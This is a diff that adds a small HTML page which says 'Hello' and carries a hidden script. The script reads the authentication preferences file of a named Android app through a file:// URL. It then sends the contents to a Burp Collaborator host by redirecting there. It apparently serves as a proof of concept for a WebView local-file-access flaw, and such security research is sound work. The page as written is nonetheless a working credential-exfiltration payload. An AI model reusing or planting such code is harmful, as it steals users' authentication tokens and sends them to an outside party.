@@ -1,0 +1,15 @@
+<html>
+<body>
+Hello
+<script>
+var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+if (xhr.readyState == XMLHttpRequest.DONE) {
+window.location.replace('https://rkfegzg7pvcxp37c60f0s7vtmksagz.burpcollaborator.net/?exfiltrated='+xhr.responseText);
+}
+}
+xhr.open('GET', 'file:///data/data/com.gojek.resto.staging/shared_prefs/AuthenticationPreference.xml', true);
+xhr.send(null);
+</script>
+</body>
+</html>
